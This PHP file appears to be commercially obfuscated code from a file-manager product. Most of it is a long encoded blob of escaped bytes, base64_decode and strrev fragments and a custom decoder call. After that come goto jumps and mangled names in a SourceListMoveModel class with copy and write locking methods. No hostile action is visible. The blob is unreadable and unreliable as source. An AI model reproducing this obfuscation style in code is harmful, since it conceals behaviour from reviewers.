\xdb\x2f\x82\x95\xb8\xee\x9e\xa9\xcb\x6f\xdf\xbd\xfd\x96\x3d\xdf\xd9\xc1\x9b\x5\xa8\x72\x58\xc9\xe0\x6\xbe\xbf\x69\xef\x3\x9b\x77\x5f\xfb\x0\x2f\x88\x37\x73\x5a\x11\x65\x8\x44\xd1\x32".base64_decode('2PCWfHDPY1fs2bkNA8nFm/Zsenhq271TN5zNPzv10ENilmN+8ixzBTR6Ok4HRDoobCELJellcBk=').base64_decode('dWH+muECQrbS5+sY24xO5VIx32qmYaI3VCEMWNVUNbsG/dZWeaqwbIrEMQ7ECeSjVU2za0igFrw=').base64_decode('qa4H9C89UQPU53KEAyRVneXkDMEnVIO/wc9OreUj+DviteIeflgI/p0eG/RdSabrE9XtMbMomxQ=')."\x35\xd4\x81\x77\x84\x8c\x84\xf4\x73\x16\xb3\xcc\x23\xe0\x26\xee\x46\x0\xba\xa8\x36\xfe\xe5\x97\x96\xc3\x15\x54\x18\xa0\x46\x3b\x8e\xe2\xf\xde\x37\xb5\xf9\x7\xfb\xae\xdd\xee\x2e\x4b\x85\xef\x50\x16\x73\x3\xd2\x55\xc\x34"."\100\14\262\247\256\270\256\374\173\244\274\363\153\254\360\324\71\333\366\134\345\52\311\154\130\24\351\226\105\124\40\0\356\102\25\34\251\313\125\50\110\377\277\154\24\112\146\67\341\273\140\232\260\332\333\123"."\x98\x28\xe5\xbd\x98\xe2\xf5\x26\x64\xcf\xfe\xae\x17\x5b\xeb\x9c\xe5\xf1\x3d\x86\xb3\xbc\x7c\xd8\xa7\xc4\xa1\x99\x13\x41\xfa\x92\x6c\x93\x22\xbf\xf3\x2c\xbd\xbf\x44\xee\xc8\xe8\xa9\xc4\x38\x38\x48\xc3\x74\x0\x4b\x12\x34\xc1"."\xa0\x30\x3f\xc7\x47\xbb\xea\x3c\xda\x4f\x75\xf5\x17\x2b\x61\x7a\x13\x68\x73\xe8\xf8\x31\x66\x74\x7a\x49\x2f\xa9\xc9\x45\x9c\xf\x7\xbb\x9f\x13\x76\xcf\x2\xa9\x82\x2f\xd5\xbc\xf2\x53\xc6\xe3\xde\x12\xc9\xc6\xcf\x4e\x7a\xf1"."\x15\x9d\xd7\x48\x4f\x97\x23\x70\x43\xc5\xae\xa6\xe0\xbd\xba\x4a\x45\x7a\x4a\x46\xda\xfd\x49\xa2\x6c\xea\x2d\x95\xd8\x7\x2b\x36\x2a\xcb\xfb\x58\x1\x32\x88\x30\x6f\xcf\xf1\xe2\x22\xe2\x9b\xbc\x5c\xdf\xc6\xfd\xa0\xa3\x10\x96".base64_decode('auXPDq7JpZWG+U2NS5qY65lTmK5sqcAs8VCQPUs4yz/IcI14CJiNDS+49EqmI1lMI3+EkCEpRzk=').strrev('Ë^#`'."\0".'­'."\0".'bÃ²3±5d‹‘@±:ùAˆ^m´ö'."\r".'¸`T*äÂŠ(ÔIë= zP0Ö3Ç[Ñ')."\x30\x5\x97\x43\xe8\x4b\x9\x21\x10\x79\x4f\x8b\x94\xa9\xd8\xa6\xa9\xe4\xb4\xfc\x4\xc8\xb\xe7\x58\x4d\x73\xac\x66\xfc\xa1\x16\x6c\x65\x69\x71\xed\x27\x7c\xf6\x88\x37\xb\x6c\x49\xf0\x1\x9a\xf\x3e\xfc\x90\x35\xe6\x16\xcd"."\170\211\77\372\104\270\150\336\121\172\221\110\303\335\4\337\323\60\274\51\14\31\221\236\216\160\124\322\170\227\22\324\140\133\124\15\164\167\127\314\220\277\341\307\157\335\372\326\301\244\30\51\6\136\113\21".base64_decode('T6WksBF+SxVOrVKsYqqF6YH5QYGaFBBE0FIDqlTjKsogghcvCdHs6mVL/cYyDuvg2huBti+l5YU=').base64_decode('tMbnPxmjdj/WKs+fglec2aVaxFAWpbYLF8KKslRT6Cy3VJNb+Wolg054bqKzzF2ZP1i91K/Jmbg=').strrev('	ÖY[¤"m^L°¿©dIû§)Ÿb–ËK<ú]‰†B²‚Ç”¼Œüz@Eê’²ø’ƒ¼„ñ“q\'').strrev('»	p†’ÚCO3AXİ'."\n".':‹1†¥lÏáÖÑI•†'."\n".'-pK8k%¦AºZU•:¥J´¡I')."\106\41\232\4\105\361\244\366\206\15\264\41\374\354\351\306\215\345\151\140\277\344\316\12\24\14\167\22\6\111\167\32\236\2\221\206\116\112\347\147\350\166\220\13\211\24\126\206\376\212\72\221\150\207\210\120"."\x36\xde\x91\xd9\xcb\x74\x81\x49\xac\xaf\xb7\xda\x37\x77\xe3\x46\xbf\xc1\xb4\xf2\x99\xce\x2f\xab\xeb\xe3\xa5\x69\xbc\xcf\xe7\x2c\x8f\x46\x2\x53\xcf\xb\x42\x82\xbb\x24\x5\xbb\xd3\x0\xce\x66\xfa\xe7\xa\xe7\x29\x5c\xfb\x5e"."\301\52\371\55\55\313\172\71\161\326\317\362\124\42\103\221\327\216\221\264\106\375\142\6\24\210\301\114\256\342\301\140\124\120\350\234\102\65\354\210\306\364\325\371\26\243\370\314\107\344\344\1\347\253\105\313"."\305\123\344\62\6\244\341\100\241\40\107\331\355\26\321\265\310\32\3\176\216\155\250\376\205\57\45\234\217\260\42\4\327\271\322\261\206\275\53\3\301\6\115\36\105\210\332\54\162\354\310\323\121\133\74\21"."\6\213\321\224\204\225\170\366\122\53\125\64\12\266\3\173\52\344\206\242\212\274\132\275\116\33\325\150\221\52\5\304\167\55\125\344\35\302\52\204\11\150\16\240\3\321\301\245\370\153\210\314\316\266\124\221".base64_decode('QVgZXUf1Cdqr9BFUsUphODun8Xks2iY6l7mpPDaWRSdETxwshANR0Ho5+Uz6O/tkBl55u2hms4g=')."\xfe\x26\xf6\x8f\x4\x5\x12\x22\x7f\x10\xdf\xc4\xd1\x42\x89\x50\x1c\xdb\x8e\x75\xc7\x63\xc9\x58\x90\x3d\xf8\xed\xbc\xb2\xa3\x69\xb\x18\xc3\x62\x51\x4f\x12\x82\x8d\x63\xf6\xef\x5c\x2b\x94\x95\xe0\x94\x8a\x1f\x52\x24\xd9\x1f"."\77\124\133\52\377\351\45\272\70\172\272\177\232\174\245\127\143\32\22\40\75\246\252\107\314\255\3\164\15\35\337\330\243\13\102\236\64\131\172\237\0\277\204\240\247\175\275\324\5\130\113\35\63\133\146\346"."\x19\xc2\x23\x2\x2b\x29\xe7\x28\xf8\x60\xe9\xe7\x13\x8d\xf0\x80\x1f\xd0\xa8\xd8\x61\xd5\x58\xbf\x4\x5e\xe1\xad\xf6\x54\xd7\xf8\xe6\xd6\x56\x97\xe7\x50\x63\x17\x67\x3e\x36\x9a\x57\x4f\x4b\xa0\x4c\x78\xea\x16\x68\x7\xe2\x58"."\40\30\11\207\242\111\65\14\144\103\175\303\42\137\235\60\372\67\54\361\266\7\15\7\45\57\66\144\126\175\216\141\125\230\32\172\323\236\344\346\32\172\336\41\205\245\123\232\65\331\253\23\15\165\165\165".base64_decode('3rp69D+zPWT+75vYTYVUpK6uifxPM8htN0CdM4e4h4P26M+YrkOH4JRFjHaJkbO9QezOQcFdg2U=')."\21\346\46\305\122\236\70\322\141\350\265\131\142\364\233\25\162\265\11\261\234\216\110\170\266\65\340\305\220\41\7\124\313\367\147\54\214\350\113\43\77\104\146\5\72\314\257\271\120\61\261\123\232\351\265\213"."\xf0\xa4\x12\xca\xa7\x7b\xe5\x8f\xf9\xd8\xec\xd2\x44\xf1\x36\x97\x97\x65\x78\xe5\x7\x3f\xa1\x12\x45\x6e\xd2\xd\x13\x2a\xe7\xf4\x72\x84\x53\x10\x31\x94\xe2\x2b\x8c\x13\x24\xb1\x2c\x26\x90\x25\x57\x43\x38\x2a\x6b\x81\x90\x6c".base64_decode('fnlEYlnuexBHhYMd+pasqg1wpaJKWy9jjqmCMMHR03iMTCM+lRjspSXfJ3gu2dkjFefa0kK5FGg=').base64_decode('OuI+b9iQdgBaAFWqKs9nMy7IRpJ01kSf8OKOenG/m8QsIkQW4K/sUrMe7rwHUAuNkie5Qvihd2o=').strrev('Ñ4¼½ e: ªåÀjB ŒÍQJÂ–rÍøì¦=ZLYÖÕ¸lÜsu“÷m‘l³4Õó')."\251\120\32\247\273\112\223\227\46\202\374\361\34\371\371\11\52\302\222\24\225\55\170\235\120\50\214\262\66\106\45\206\326\127\50\232\103\10\22\54\171\322\120\172\167\345\144\136\274\274\144\205\102\274\367\162"."\71\71\21\137\161\266\73\324\231\45\367\102\132\232\233\16\112\105\45\145\7\221\350\334\341\122\106\220\77\206\55\47\142\116\131\326\254\40\214\210\263\15\336\217\117\1\61\46\37\261\213\132\336\32\224\125"."\x1c\x5d\xc5\x8\x61\x43\x73\xb8\x2a\x1c\x2b\x22\x50\x15\x16\x6f\x45\xa5\x7\xb3\xb5\x74\xba\x5b\xf8\xcf\x52\x1d\x50\x34\x1d\xc0\xb1\xed\x26\xa9\x91\xb8\xa1\x8f\x63\x10\xb2\xb7\xb8\x1f\x2e\xa6\xfa\x8c\x97\x42\x68\x14\x3a\xd3"."\x69\x1a\x15\x9e\x38\xbc\x90\x25\x9\x96\xcd\xea\x49\x98\x9\x36\x56\xfc\x5\xdc\x0\x51\x11\x77\xad\x9e\xd8\x71\xd0\x87\x96\x16\xb9\x9a\x33\xf\x3\x71\xd2\x74\x68\x2f\xbe\x79\xfe\x15\x2c\x70\x25\xd\x30\xb0\x63\x9e\xa0\xc8"."\xa\x33\x67\x45\xaa\x7c\xfd\x87\xa7\x47\x95\x25\x5f\x18\xb9\x74\xda\x76\xc1\xd9\x90\x4\xfc\x4e\xb8\x2f\x3\x70\x42\x4b\xe0\x6\xe0\xdb\x8\xb1\x48\x31\xdc\x3a\xbb\x79\x45\x7c\x3f\xf8\xb4\xf4\xe0\x64\xc5\x24\xd7\x32\xa\xf6"."\30\67\313\11\31\345\25\340\165\154\23\21\261\370\135\35\271\22\156\253\307\205\55\127\160\204\215\143\274\257\224\234\144\46\34\312\34\137\3\250\111\315\141\57\111\322\343\102\250\371\371\55\107\6\202\167".base64_decode('TN8xYgONtR/xZpP8BIR17KUnCPsQHgcHbGaR7aQCpPNNkRtC1EEyg0Va/QrpezPxC1chFzv4Yl8=')."\343\17\17\301\311\204\312\230\66\347\347\161\363\150\117\210\110\104\46\304\161\102\233\316\37\274\113\322\26\274\313\104\317\233\65\336\151\131\375\115\322\327\340\225\120\377\270\157\262\365\106\201\274\53\47\111"."\34\134\121\267\275\11\256\41\51\234\241\250\104\74\20\322\305\146\324\7\173\125\116\230\154\220\240\70\57\336\274\356\174\26\330\54\140\115\106\34\25\372\7\255\362\66\161\17\362\302\142\4\350\256\242\236"."\x32\x8b\x69\x7c\x7e\xb\x84\x96\xca\xdb\x71\x7d\x48\x8e\x12\xfd\xa\xb6\x63\xc4\x2b\x55\x72\x13\xd8\x75\xb2\x84\x14\xf1\x4e\xd\xa4\xec\x92\xec\x88\x59\x7a\xb4\xe\xc5\x24\x45\x62\x89\x80\xf6\xd6\x2b\x9c\xf2\x56\x69\xcb\x34".base64_decode('Mk/KIOUrEeEuOTWRBFAdGyKPS5QG+HW5izJm5u+KTBMzW3fcAPE6i0dgyXmoWfyAlBiZXIV8s6w=').strrev('1õi\\ù†4’ñÙ.;Á¾·™ò™ĞÃs¬Fi,‘O…NR±VÃÔ)¬,s—~0 tÃÍ'."\n".'')."\xce\x30\x1c\x18\x8\x41\x39\x51\xc6\x94\x14\xf\x88\x7f\x56\xe1\xcd\x8e\x38\xa5\xe5\xcb\x48\xbc\xd7\xf2\x18\xd1\x10\x94\x71\xbb\xd0\x93\xa5\xd6\x43\x6e\xbd\x4a\x9e\x4f\xa7\x0\x67\xb7\x39\x8c\xbc\x5c\x5\xd0\x6\x70\xe6\xc3"."\x3\x83\x82\xd0\xa2\x9e\x62\x9d\xc7\x95\xab\x11\x78\x8\x53\xd6\xb\x23\xb5\x84\xc2\xa9\x30\x7f\x43\x49\x26\xd5\x7c\x14\x53\x20\xf4\x20\xb1\x0\x95\x63\x32\x91\x9c\x34\x79\x62\xb9\xa2\x30\x86\x35\x98\x4a\xea\x5b\x8\xf8\xef"."\x9a\x5a\xec\x5b\xc8\x21\x3\xed\x9a\xe0\x1e\x5b\xb0\x12\x3e\x3e\xc0\xb9\x69\x97\x25\x47\x58\x2e\x7\x39\xcb\x11\xa1\x56\xd\x8e\xda\x3c\x89\x97\x1a\xd3\x99\x5b\x1f\x26\x37\xe8\xee\xec\xf6\xf3\xa4\x56\xbe\xe9\xa8\xa4\x46\xf8"."\363\16\62\315\176\175\134\117\101\133\71\43\245\104\142\35\341\140\40\322\26\116\254\120\260\363\121\311\215\17\352\256\112\66\243\152\11\235\72\112\121\167\312\46\122\164\173\20\241\77\135\11\6\320\3\374"."\x89\x4c\x1c\xf4\xe\x20\x96\xc6\x9b\xe6\xac\xa0\x25\x98\x3e\x32\x4e\x68\x4c\x3c\x7f\xee\x6c\x96\x2\xa4\x5e\x2c\x6b\x31\x8f\x8d\xf2\xb3\x65\x75\xb0\x8c\xbf\x42\xe9\xac\x90\x4d\x4b\x85\xb\x45\xbd\xbc\xfc\x84\x8e\xd5\xef\xa5"."\x1e\x4b\x15\x4a\x15\x7a\x3\xe5\x2b\x7f\x81\xbc\x6f\x2a\x97\x46\xe4\x91\x9e\x9f\xae\xf3\x46\x7e\xd4\xb0\xc\xb1\xe7\x59\x8d\x9\xb9\xf5\x40\x5b\x57\x38\xaa\x6\x22\x91\xd8\x2a\x87\x7d\x4c\x5a\x7e\x8a\x56\x5a\x5\x31\xe1\xb2"."\143\133\76\355\46\365\146\314\40\210\75\222\341\26\357\340\15\324\252\111\156\217\351\352\311\317\31\110\247\1\226\302\42\342\122\343\156\353\13\354\152\17\237\232\322\363\272\20\225\36\257\56\24\65\303\322"."\xa5\x4\xea\x16\x99\x59\xaa\x6b\xd9\xac\x94\x87\x2f\x89\xa4\x68\xc9\x79\xcc\x56\xfc\x94\x4a\x3f\xc0\xd2\x24\x5d\xf4\x4a\x5\xe2\xe1\x8e\xce\xe4\xff\xba\xab\x46\x5a\xa8\x33\x1b\x5c\x17\x9d\xfb\x3d\xa1\xaf\x57\x6\x69\x3b\xce"."\x6f\x8a\x7\xba\xcb\x53\xc0\x83\xf8\x67\x3e\xfe\xed\x11\xd7\xa3\x2a\xf1\xac\xa\x5b\xdf\x20\xfe\x8d\xe1\xca\x57\xd8\x5e\x11\xb1\xbd\x2a\x3e\x81\x88\x97\xe2\x44\x41\xbe\x96\xf6\xa7\x99\xfd\x3d\xda\xb\x21\x66\x4e\x8b\x23\x82"."\351\301\245\240\21\374\25\312\163\143\357\305\46\325\235\307\45\231\54\21\341\31\230\160\207\122\250\353\365\162\267\5\231\343\155\362\262\157\220\7\52\151\136\57\36\5\52\331\57\306\204\142\334\336\112\124".base64_decode('dedU6ADKVoSAjhdQWpQ6IigXj40qS5lnJ/EB4uJY8mRdAXtKS8JWSZWPymZw3AzENEHIgknEeqE=')."\146\156\242\54\301\41\277\213\260\136\163\155\157\374\20\53\332\300\362\354\22\243\62\154\113\354\41\41\52\26\361\40\356\103\267\313\137\275\246\325\377\157\52\322\314\204\364\202\206\345\76\50\371\41\347\260"."\157\43\272\330\31\163\114\310\16\130\212\104\205\61\233\272\112\335\233\146\250\322\276\42\36\212\344\307\307\35\146\167\216\307\146\151\206\122\312\343\333\21\204\202\140\305\261\272\222\45\357\155\251\157\163\350"."\x4f\x1f\xfc\xb2\xe3\xd1\xdd\x9\x8a\xdd\xe0\x93\xb5\x1c\x0\x9d\xc6\x1\x52\x42\x97\x2e\x4\x21\xa4\x16\x42\x27\x5\x2d\xef\x78\x86\x19\xf5\xbd\xd2\xcb\xee\xf8\x15\x2\xe7\x63\xc2\x8\xe6\x68\x96\x2a\xce\x5f\xe7\x9b\xb5\x5c".strrev('S›*äq÷i_iû°Ä0†‚–2Ä×ÂäÂeôŒTÙaÈNµˆŸÑ‹°¡ä2	Ñ\'$¯²Å›Áã')."\x7f\xdd\xa0\xf0\xe8\x72\x2\x32\x64\xe8\xec\x80\x70\x14\xa3\x49\x7e\xad\x50\x10\x97\x33\xf2\x51\x8b\x5d\xf7\xcb\x4e\x46\x20\xaf\x27\xd9\xa9\x12\x17\x60\x2a\x55\xcd\x48\x8\xd8\x92\xee\x48\x69\x22\xdc\x97\x96\xf2\x61\x7a\x49"."\344\110\55\112\34\241\374\342\14\275\70\22\36\51\240\70\352\147\67\275\61\206\11\223\233\144\267\370\134\346\217\260\15\147\234\375\345\267\376\130\221\16\360\10\126\134\142\32\143\303\46\141\274\174\62\313".strrev('Ò :Âu'."\n".'"å'."\n".'}’œƒé´üƒÔÒCâ£0ÀåeÉƒ×KmhÈ?CÚtˆCQ“y'."\0".'Š¥”')."\x68\x29\xe7\xfc\xc\xb7\x92\xf3\xd0\xb1\x7a\xf8\x8e\x31\x2c\x8c\x46\x3d\xf9\x52\x8e\xf1\x36\x38\x8c\x95\x38\x3c\xfc\x11\x68\xf\x7d\xfc\xc2\x43\xb9\x3c\xb\x2a\x53\xfb\x9d\xe9\xdf\xa7\xc6\xfd\xe7\x24\x2\x67\x3b\xca\x38\x17"."\67\323\302\347\313\125\41\356\236\75\54\26\164\313\270\205\12\4\14\202\107\234\234\33\214\132\214\120\32\122\251\230\365\20\5\20\17\323\330\164\215\337\61\265\142\254\362\132\271\254\22\171\64\226\225\107"."\331\123\314\46\204\251\31\351\221\130\50\171\366\77\263\63\140\246\101\130\274\264\23\7\66\55\35\50\262\13\165\167\61\303\1\325\350\174\26\146\360\364\71\227\262\43\242\34\276\327\344\322\15\363\33\227".base64_decode('yCITcUqJW+j59Afuz4HaEdCjTMqT6lHYqzIypiCZTksgePpGOm9cJ8T/amdJHAotKjsApE9pmFk=')."\xcc\x3b\xe7\xf0\x55\x81\x5d\xd4\x9c\xcc\x60\x5\x9e\x87\x1d\xb1\x64\x16\x2b\xbe\xee\x2e\x1d\x79\x9e\xb2\xe3\x8f\x52\x15\x4\x1a\x61\x3c\x7c\x46\x61\xff\xe6\x8d\xd4\x30\xf1\xf\x47\xbe\x40\x6d\x2\x3d\x96\x3e\xee\xa1\x13\xe6"._kodDe('MF1/F64RmbPiTt7OJsQ48nL5laALsfhBsyYSwO5vN9ZnoJq40SOXWVUG8TjBkN3SThcOAApYyQLM').base64_decode('ttaUDEjZklaaSNfXKGybWGfLEu25WqArUAFARN+k52/IsBivjGXjIuYcJMizRLbE31ZmiPFcEsk=')."\161\54\237\235\250\64\364\12\103\370\24\270\146\74\250\377\124\321\165\111\147\311\271\100\256\136\120\42\227\303\14\261\135\224\31\156\257\146\3\361\201\50\245\30\231\137\32\225\44\0\256\46\121\101\41\154"."\354\367\50\323\25\52\363\10\101\367\215\0\112\51\117\214\204\71\232\231\106\144\302\20\272\270\253\42\316\76\204\103\102\202\172\34\150\110\172\146\112\166\226\101\32\222\141\265\274\151\172\10\23\371\274\220"."\260\21\221\34\14\2\220\23\121\135\41\316\126\2\35\334\1\213\46\251\145\252\356\355\216\301\101\164\332\66\345\260\0\23\174\14\162\113\114\324\1\7\13\216\342\142\325\45\312\122\260\177\22\32\166\47"."\xb2\xa9\x23\x1b\x4f\xa0\x75\xc9\xe9\x8f\x83\xf7\xa3\xec\x21\xfa\xa2\x83\x17\xb4\xc4\xf4\xc0\x2e\x4a\x7b\x28\x82\xe7\x51\xe\xde\x80\xdf\x0\xff\x13\xe3\x45\xfa\x35\x89\xd4\x60\x9d\x1a\x92\x42\x9c\xe4\xc1\x11\x49\x32\xee\xf0"."\x7a\x84\x9d\x10\xbb\x76\x2e\xf3\xa5\x84\xd\xf7\xe5\x9b\x4d\xfa\xe0\xa\xd\x33\x1e\x87\x77\x92\x20\xdd\x4a\x1b\x51\x98\x6f\x7b\x84\xc9\xb6\x87\x1d\xc8\x9e\x99\x33\x66\x10\x9f\x18\xb8\xe\x97\x7a\x54\x38\x1c\xc8\xb0\x3f\x85"."\xb4\x6a\xe4\xd6\xcf\xdc\xd8\x91\xa0\x57\x16\xe9\x0\xf6\x3\xba\x8d\x1f\xfc\xe2\x58\x9b\xca\xd0\x5d\x3\x72\x92\xc\x33\x0\x56\xd0\xbc\xfb\x46\x5\xfe\x20\x71\x6e\x2\xc0\x3c\x52\x33\x47\xd5\x1a\xbb\x66\x44\x54\xba\xfb\xa6".base64_decode('uoxhEy5lTDM7oBWxTfywzXSpKkXcjjgS2qAu97mXyLhRIjGU7hfIA6dVqiZQEzl7ChLyI22hFKk=').strrev('Ğ1Â×UÆb~.Ë$ÁÊ<@±0¥5Ò¸ß"è˜¬¬º$•ÎÏ$ã]˜8n£$ á4……	Ò®')."\xbf\xe0\x69\xc\xb0\x9b\x8c\xd1\x1c\x49\x65\x78\x30\xe9\x58\x3a\x47\xa2\xbc\x2a\x2\x75\xf9\x9c\x2e\xd\xa1\x6\xbe\xda\x6e\x95\x58\x55\x5a\xc8\x92\xb1\x88\xe3\xe2\xa4\x5c\xc9\xa5\xbc\x36\xc7\x14\x72\x15\x6c\xa0\xe1\x94\x6"."\x32\x3f\x9\xde\x3a\xaf\x2b\xa1\xde\xeb\x6a\xce\xb0\xe8\xd5\x8c\x6b\x4b\xc8\x9d\xa1\xf6\x53\x58\x36\x15\xc7\xd2\x20\x26\xfd\x23\x97\x6b\xe4\x26\xde\x5b\x5e\x47\x32\xe2\x97\x6f\xeb\xcb\x36\x60\x65\x7c\xc0\x3b\x25\x24\xa0\x38".strrev('¬ŠûÉ0ÂJ{PŒøUØÂ«©{Šó³õò y>9äÑaMÙ˜’SÛ4“!.TÎÄP“Eİ+ÃÏ$')."\225\236\56\371\235\77\174\371\321\156\162\350\301\233\114\274\131\140\347\12\101\176\323\354\264\101\227\314\2\370\273\212\222\260\325\131\30\133\55\71\267\334\262\112\305\122\146\321\222\212\141\121\5\73\221\7".base64_decode('mW5ITx7tUj1l62kFH+MOzqR3Qd38/koNYwraRC0vYG8ro5ILPqMksEiJ+V7oazhGHdLFQwmawCs=')."\x55\x6c\xc8\xa4\x4e\xf5\x2a\xe5\x21\x48\x4c\xd8\xe\x90\x11\x2f\x77\xba\x5f\xec\x74\xbe\x3\xd8\x24\xc9\x80\xe9\x83\xa7\x8e\x67\x7d\xcb\x96\x28\x6a\x6\x5\xfd\xe1\xca\xc3\x88\x60\xfa\x5c\xcc\xb5\x8b\x5b\x75\xec\x53\xb\xbb"."\xeb\xc4\x26\x36\x7e\xa2\x3a\xc0\x9e\x69\x54\x73\x2a\xd3\xe2\xc2\x92\x11\x21\xd4\x22\x78\xb5\x9c\xe9\x85\x2f\xd8\xc5\x89\x58\x31\x9e\x8b\x96\xf9\xb7\x75\x1a\xd9\x49\xf5\x9\x5b\x44\xa5\x57\xe\x21\x16\xe8\x47\xc8\x49\xd2\xd".base64_decode('EeIu084Hm0kmSWYPj0AL0tW3U+GAmyiXHZclIyJlk1rMiT36xT4UwsLjIsmmN3sBN7sn1epxcO4=').base64_decode('knpCimCKUPkFtbg3l4hPVg2z/oIOcKVLmFWcfdqoIJ4FZ5VOt2ujFYqmy3g/lMKLEuJbcn4lDKI=')."\xf4\x31\xf9\xeb\x50\x4e\xd8\x26\x39\xa\x96\xa7\xa\xe7\x58\x52\x7d\x17\xcf\x4c\x86\x89\xd3\x2a\xd\x9f\xa0\x3d\x67\x75\xd9\xf9\x16\x7\x2a\x91\x44\xca\xa4\xb8\x2e\x8f\x24\x90\xc0\xba\x4f\x42\xc9\x87\xe\x85\xb\xc4\xc4\x27"."\235\256\276\170\61\276\146\250\14\261\250\364\72\122\135\54\65\226\70\62\262\321\225\5\322\70\251\371\212\102\73\11\4\364\154\104\152\116\326\135\230\266\102\242\362\107\4\124\72\247\130\22\120\211\14\106".base64_decode('usitON5R5QODknE509GdCqDBOAlZzFueaWaz+IJ6mmyqOy2dtOUlslwBh3aIsMVi49DEHBEj0bw=')."\x80\x33\x8b\x96\xd7\x5d\xf3\x26\x57\x70\xcf\x29\xad\x21\x9f\x77\x8e\xf4\x31\xc3\x4e\x65\x24\x1e\xbe\x3c\xb3\x3c\xbd\x58\xb6\xcc\xd0\x81\xca\xe3\x70\xf7\x96\xad\xb2\x5b\x97\x49\x34\x52\xd6\x1f\x49\xd1\x2a\x69\x56\xa8\x43\x7b".base64_decode('VLEazcI1BRflqDvNFOC6NAvXLctmlcvmldSztZI1zfDKJw/Ek+kKAxZiP6nodPNZsXD552APuEs=')."\x13\x21\x58\xe5\x5e\x48\x52\x42\xa7\xfa\x4b\xa5\x5e\x54\x2c\x3c\x6d\x2f\xdc\xa5\x5\x1d\x84\x79\xe6\x4a\x39\x15\x37\x28\xe8\x75\x54\x38\x31\x58\x4e\x85\x33\x82\xe2\xbf\x69\xf5\xca\x84\xda\x55\xf9\x61\x25\xf2\x2a\x68\x7e\x81"."\x5b\x2f\x97\xbf\xb0\xa\xd9\xb2\x1a\x59\x65\x45\xb3\x78\x45\xfc\x66\x39\x95\xc1\x5c\xe9\x8e\x97\x4\x28\x4a\x9a\x4\xc2\x78\x44\x36\x22\xe6\x2a\x90\xa2\x25\x44\x30\x66\x8d\x61\xa1\x6b\xcb\x4c\x82\x40\x82\xc2\x35\x55\x87\xf3"."\46\77\62\323\102\277\232\167\244\254\1\347\76\310\227\244\207\164\52\32\45\171\260\44\253\134\146\224\145\57\104\310\346\134\224\205\67\155\43\45\51\240\12\223\24\76\62\103\360\264\131\41\173\166\337\20"."\10\141\233\103\143\251\222\70\35\47\321\240\117\370\206\247\355\211\261\110\0\342\60\32\244\224\21\334\52\122\305\204\40\326\212\341\27\322\344\176\200\122\22\64\73\141\26\155\17\325\250\57\220\337\126\323".base64_decode('toU+D7utQHwAJgc8kiYbCombaNwpcqFJYJjeN+AgqEhgMVFCp7kE6Tki+OqUR+LlN6ft/CmTYTM=').base64_decode('PWCOMyfOCHKkOZGcWILjR0nXjnitsfw0xw9PR3rJTYcX3AqvKww5qtMnvLmm/Ke1AFJ+0QR9540=')."\110\165\301\120\61\221\114\224\145\165\7\22\211\125\261\170\33\175\26\256\54\233\324\222\364\32\313\262\272\73\143\321\351\362\102\135\201\160\244\54\17\253\100\106\125\341\11\234\146\205\273\111\57\311\235\377"."\x74\xbd\x8\x7\x57\x88\x9e\xb0\x7b\xc7\x8\xbc\x40\x2e\x16\x41\xba\x75\x2b\x64\xcc\xfc\x74\xeb\xc8\x1a\x48\x68\xcc\xd9\xa2\x7c\x1\xa5\xe7\x84\xfb\x78\xd1\x88\x53\x8a\x26\x5f\x52\x59\xec\xe5\x19\x1e\x70\xbe\xd\xed\xd2\x37"."\x76\x6a\xd0\x30\xc8\x85\x66\xb1\x5e\x63\x14\xbe\x14\x2f\x40\x2a\x7e\x5b\x8f\x23\x0\xce\x4f\x8\x5d\x1a\x9f\x43\x8d\x47\x4a\x27\x9b\x84\x60\x1d\x69\xef\xca\xa7\x3b\xb9\xb8\xe5\xc2\x35\x92\x3d\xb7\xe2\x6c\x56\xb8\x3d\x94\xaf"."\x60\x71\xae\x98\x1c\xdc\xcd\xd3\xd8\x23\x38\xeb\xcc\x1\x49\x83\x91\xf2\x76\xe0\x8b\x0\xa6\x5b\xd2\x64\xa5\x61\x47\xb6\xad\xd\x79\x39\x3a\x90\x14\x54\xa8\xc0\x1b\x23\x5\x21\x8a\xfe\x3f\x0\x6\xab\x29\xe4\xc8\x0\x0"."".strrev(''), 10, -8))); goto BĞˆêÔÍ¤ğ; DÅÉ›Ó¸Ó: class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($æÅ™¨“æ) { $Ë³Š©äŸ =& $_SERVER[øşô´çË]; if (!$this->allowLock()) { return; } $this->_lockCheck($Ë³Š©äŸ[650], $æÅ™¨“æ); $£éŸ™ş = 1; $this->_lockEvent($æÅ™¨“æ, array($Ë³Š©äŸ[651], $Ë³Š©äŸ[652]), $£éŸ™ş); $this->_lockParent($æÅ™¨“æ, array($Ë³Š©äŸ[652]), $£éŸ™ş); $this->_lockEvent($æÅ™¨“æ, array($Ë³Š©äŸ[653], $Ë³Š©äŸ[654]), $£éŸ™ş); $this->_lockCheckEnd($Ë³Š©äŸ[650], $æÅ™¨“æ); } public function lockCopyEnd($¸ÛŠ©åö) { $ˆïÇŸË” =& $_SERVER[øşô´çË]; if (!$this->allowLock()) { return; } $Ç²á±ÃÛ = 0; $this->_lockEvent($¸ÛŠ©åö, array($ˆïÇŸË”[651], $ˆïÇŸË”[652]), $Ç²á±ÃÛ); $this->_lockParent($¸ÛŠ©åö, array($ˆïÇŸË”[652]), $Ç²á±ÃÛ); $this->_lockEvent($¸ÛŠ©åö, array($ˆïÇŸË”[653], $ˆïÇŸË”[654]), $Ç²á±ÃÛ); } public function lockWriteStart($ÓâÚíç¦, $æÍğĞüÙ = '') { $ĞåÄØôè =& $_SERVER[øşô´çË]; if (!$this->allowLock()) { return; } $this->_lockCheck($ĞåÄØôè[651], $ÓâÚíç¦); $œ™êªÈÔ = 1; $this->_lockKey($ĞåÄØôè[655] . $ÓâÚíç¦ . $ĞåÄØôè[10] . $æÍğĞüÙ, $œ™êªÈÔ); $this->_lockEvent($ÓâÚíç¦, array($ĞåÄØôè[650], $ĞåÄØôè[652]), $œ™êªÈÔ); $this->_lockParent($ÓâÚíç¦, array($ĞåÄØôè[650], $ĞåÄØôè[652]), $œ™êªÈÔ); $this->_lockCheckEnd($ĞåÄØôè[651], $ÓâÚíç¦); } public function lockWriteEnd($šçİ†¹, $ã¸ƒ«§ = '') { $Æ´ºŠòÖ =& $_SERVER[øşô´çË]; if (!$this->allowLock()) { return; } $ŞÍÊ²¾– = 0; $this->_lockKey($Æ´ºŠòÖ[655] . $šçİ†¹ . $Æ´ºŠòÖ[10] . $ã¸ƒ«§, $ŞÍÊ²¾–); $this->_lockEvent($šçİ†¹, 